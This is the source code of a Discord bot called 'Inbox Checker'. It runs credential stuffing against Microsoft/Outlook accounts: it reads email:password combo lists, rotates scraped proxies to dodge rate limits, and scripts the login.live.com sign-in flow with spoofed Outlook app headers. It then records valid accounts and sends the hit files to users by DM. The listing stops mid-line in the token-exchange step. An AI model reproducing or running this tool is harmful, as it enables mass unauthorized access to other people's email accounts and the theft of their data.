import os
import uuid
import asyncio
import aiohttp
from datetime import datetime, timedelta
from threading import Lock
import shutil
import json
from typing import Any, Callable
import functools
import logging
import discord
from discord.ext import commands
from discord import app_commands
import requests

# -----------------------------------------------------------------------------------
#                     LOGGING SETUP
# -----------------------------------------------------------------------------------
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# -----------------------------------------------------------------------------------
#                     PER-USER SESSIONS AND STATS
# -----------------------------------------------------------------------------------
user_sessions_lock = Lock()
user_sessions = {}
concurrent_checks = asyncio.Semaphore(50)  # Increased to 50 threads for checking

def get_user_session(user_id: int) -> dict:
    with user_sessions_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = {
                "should_stop": False,
                "is_running": False,
                "good_count": 0,
                "bad_count": 0,
                "total_checked": 0,
                "service_hits": {},
                "results_cache": {}
            }
        return user_sessions[user_id]

def reset_user_session(user_id: int) -> None:
    with user_sessions_lock:
        user_sessions[user_id] = {
            "should_stop": False,
            "is_running": False,
            "good_count": 0,
            "bad_count": 0,
            "total_checked": 0,
            "service_hits": {},
            "results_cache": {}
        }

# -----------------------------------------------------------------------------------
#                     SESSION FOLDERS PER USER
# -----------------------------------------------------------------------------------
def prepare_user_session_folder(user_id: int):
    session_path = f"results/{user_id}"
    if os.path.exists(session_path):
        shutil.rmtree(session_path, ignore_errors=True)
    os.makedirs(session_path, exist_ok=True)

def save_result_for_user(user_id: int, service_name: str, email: str, password: str):
    session_path = f"results/{user_id}"
    os.makedirs(session_path, exist_ok=True)
    filename = os.path.join(session_path, f"{service_name.lower()}.txt")
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"{email}:{password}\n")

def get_user_results(user_id: int):
    session_path = f"results/{user_id}"
    if not os.path.exists(session_path):
        return []
    return [os.path.join(session_path, f) for f in os.listdir(session_path)]

def clear_user_results(user_id: int):
    session_path = f"results/{user_id}"
    shutil.rmtree(session_path, ignore_errors=True)

# -----------------------------------------------------------------------------------
#                     DISCORD BOT CONSTANTS / GLOBALS
# -----------------------------------------------------------------------------------
REQUIRED_GUILD_ID = 1361177816548507759
REQUIRED_ROLE_ID  = 1371479532627951657
ALLOWED_CHANNEL_ID = 1361177816548507762

OWNERS = {1351207904019218543}

# -----------------------------------------------------------------------------------
#                     PROXY MANAGEMENT
# -----------------------------------------------------------------------------------
proxy_list_lock = Lock()
proxy_list = []

def fetch_proxies():
    global proxy_list
    try:
        response = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10)
        if response.status_code == 200:
            proxies = [line.strip() for line in response.text.splitlines() if ":" in line]
            with proxy_list_lock:
                proxy_list = proxies[:200]  # Increased to 200 proxies to handle 50 threads
            logger.info(f"Fetched {len(proxy_list)} new proxies")
        else:
            logger.warning("Failed to fetch proxies, using existing list")
    except Exception as e:
        logger.error(f"Error fetching proxies: {e}")

def get_next_proxy():
    with proxy_list_lock:
        if not proxy_list:
            fetch_proxies()
        if proxy_list:
            return proxy_list.pop(0)
    return None

async def test_proxy(proxy: str) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://www.google.com", proxy=f"http://{proxy}", timeout=5) as response:
                return response.status == 200
    except Exception:
        return False

# -----------------------------------------------------------------------------------
#                     RATE LIMIT HANDLING WITH PROXY
# -----------------------------------------------------------------------------------
async def safe_api_call(coro, max_retries=5, base_delay=2):
    retry_count = 0
    while retry_count < max_retries:
        proxy = get_next_proxy()
        if not proxy or not await test_proxy(proxy):
            logger.warning("No valid proxy available, retrying without proxy")
            proxy = None
        try:
            logger.info(f"Attempting API call with proxy: {proxy}")
            if proxy:
                async with aiohttp.ClientSession() as session:
                    async with session.request(
                        method="GET" if isinstance(coro, str) else coro.__name__,
                        url=coro if isinstance(coro, str) else None,
                        proxy=f"http://{proxy}" if proxy else None,
                        timeout=10
                    ) as response:
                        return await response.text() if isinstance(coro, str) else await coro
            else:
                return await coro
        except discord.errors.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after or (base_delay * (2 ** retry_count))
                logger.warning(f"Rate limit hit, retrying after {retry_after} seconds (attempt {retry_count + 1}/{max_retries})")
                await asyncio.sleep(retry_after)
                retry_count += 1
                continue
            logger.error(f"API call failed: {e}")
            raise e
    logger.error("Max retries exceeded for API call")
    raise Exception("Max retries exceeded for API call")

# -----------------------------------------------------------------------------------
#                     STOP BUTTON PER USER
# -----------------------------------------------------------------------------------
class StopView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="Stop", style=discord.ButtonStyle.danger, custom_id="stop_button")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        if interaction.user.id != self.user_id:
            await safe_api_call(interaction.response.send_message("You cannot stop someone else's check.", ephemeral=True))
            return
        session = get_user_session(self.user_id)
        session["should_stop"] = True
        button.disabled = True
        await safe_api_call(interaction.response.edit_message(view=self))
        await safe_api_call(interaction.followup.send("Stop button pressed. Your processing will halt soon.", ephemeral=True))

# -----------------------------------------------------------------------------------
#                     EMBED FOR PER-USER STATS
# -----------------------------------------------------------------------------------
def build_stats_embed(user_id: int) -> discord.Embed:
    session = get_user_session(user_id)
    embed = discord.Embed(title="Inbox Checker", color=discord.Color.red())
    embed.add_field(name="Total Checked:", value=str(session["total_checked"]), inline=True)
    embed.add_field(name="Valid:", value=str(session["good_count"]), inline=True)
    embed.add_field(name="Invalid:", value=str(session["bad_count"]), inline=True)
    breakdown = ""
    for service, names in session["service_hits"].items():
        breakdown += f"> {service.capitalize()}: **{len(names)}**\n"
    if not breakdown.strip():
        breakdown = "No inbox hits found yet."
    embed.add_field(name="Service Hits", value=breakdown, inline=False)
    embed.set_footer(text="Made by aries")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1355921298487771136/1355926602650877952/IMG_3967.jpg")
    return embed

# -----------------------------------------------------------------------------------
#                     DM RESULTS PER USER
# -----------------------------------------------------------------------------------
async def dm_results(user: discord.User) -> None:
    dm_channel = await user.create_dm()
    files = get_user_results(user.id)
    if not files:
        await safe_api_call(dm_channel.send("No results available."))
        return
    attachments = [discord.File(fp) for fp in files]
    batch_size = 5
    for i in range(0, len(attachments), batch_size):
        batch = attachments[i:i + batch_size]
        try:
            await safe_api_call(dm_channel.send("Here are some of your results:", files=batch))
            await asyncio.sleep(2)
        except Exception as e:
            logger.error(f"Error sending DM: {e}")

# -----------------------------------------------------------------------------------
#                     CHECKER LOGIC (ALL + SINGLE)
# -----------------------------------------------------------------------------------
async def check_all_file(file_content: str, user_id: int) -> None:
    session = get_user_session(user_id)
    async with aiohttp.ClientSession() as http_session:
        tasks = []
        for line in file_content.splitlines():
            if session["should_stop"]:
                break
            if ":" in line:
                parts = line.strip().split(":", 1)
                if len(parts) == 2:
                    email, password = parts
                    tasks.append(all_checker_logic(user_id, email, password, http_session))
        await asyncio.gather(*tasks)

async def check_one_file(file_content: str, service_email: str, user_id: int) -> None:
    session = get_user_session(user_id)
    async with aiohttp.ClientSession() as http_session:
        tasks = []
        for line in file_content.splitlines():
            if session["should_stop"]:
                break
            if ":" in line:
                parts = line.strip().split(":", 1)
                if len(parts) == 2:
                    email, password = parts
                    tasks.append(one_checker_logic(user_id, email, password, service_email, http_session))
        await asyncio.gather(*tasks)

# -----------------------------------------------------------------------------------
#                     REPLACING THE 'all' CLASS LOGIC
# -----------------------------------------------------------------------------------
async def all_checker_logic(user_id: int, Email: str, Password: str, http_session: aiohttp.ClientSession):
    session = get_user_session(user_id)
    proxy = get_next_proxy()
    if not proxy or not await test_proxy(proxy):
        logger.warning(f"No valid proxy for {Email}, skipping")
        return
    try:
        async with http_session.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1"
            f"&login_hint={Email}"
            "&mkt=en"
            "&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent": "Mozilla/5.0"},
            proxy=f"http://{proxy}",
            timeout=10
        ) as r:
            if r.status != 200:
                logger.info(f"Could not get OAuth params for {Email}")
                return
            cok = r.cookies
            text = await r.text()
            if "urlPost:'" not in text:
                logger.info(f"Failed parsing for {Email}")
                return
            url_post = text.split("urlPost:'")[1].split("'")[0]
            PPFT = text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
            AD = str(r.url).split("haschrome=1")[0]
            MSPRequ = cok.get("MSPRequ", "")
            uaid = cok.get("uaid", "")
            RefreshTokenSso = cok.get("RefreshTokenSso", "")
            MSPOK = cok.get("MSPOK", "")
            OParams = cok.get("OParams", "")
            await do_login_protocol_all(user_id, Email, Password, url_post, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, http_session)
    except Exception as e:
        logger.error(f"Error in all_checker_logic for {Email}: {e}")

async def do_login_protocol_all(user_id: int, Email: str, Password: str, URL: str, PPFT: str,
                                AD: str, MSPRequ: str, uaid: str, RefreshTokenSso: str, MSPOK: str, OParams: str, http_session: aiohttp.ClientSession):
    session = get_user_session(user_id)
    proxy = get_next_proxy()
    if not proxy or not await test_proxy(proxy):
        logger.warning(f"No valid proxy for {Email}, skipping")
        return
    try:
        data_str = (
            f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1"
            "&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={Password}"
            "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={PPFT}"
            "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
            "&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        )
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(data_str)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{AD}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": (
                f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; "
                f"MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid.uuid4()}"
            )
        }
        async with http_session.post(URL, data=data_str, headers=headers, proxy=f"http://{proxy}", allow_redirects=False, timeout=10) as res:
            cook = res.cookies
            hh = res.headers
            if any(k in cook for k in ["JSH", "JSHP", "ANON", "WLSSC"]) or await res.text() == "":
                with user_sessions_lock:
                    session["good_count"] += 1
                    session["total_checked"] += 1
                await do_get_token_all(user_id, Email, Password, cook, hh, http_session)
            else:
                with user_sessions_lock:
                    session["bad_count"] += 1
                    session["total_checked"] += 1
                logger.info(f"Bad Account: {Email} | {Password}")
    except Exception as e:
        logger.error(f"do_login_protocol_all error for {Email}: {e}")

async def do_get_token_all(user_id: int, Email: str, Password: str, cook: dict, hh: dict, http_session: aiohttp.ClientSession):
    session = get_user_session(user_id)
    proxy = get_next_proxy()
    if not proxy or not await test_proxy(proxy):
        logger.warning(f"No valid proxy for {Email}, skipping")
        return
    try:
        if "Location" not in hh:
            logger.info(f"No location header for {Email}")
            return
        loc = hh["Location"]
        if "code=" not in loc:
            logger.info(f"No code= param for {Email}")
            return
        code = loc.split("code=")[1].split("&")[0]
        CID = cook.get("MSPCID", "").upper()
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.out
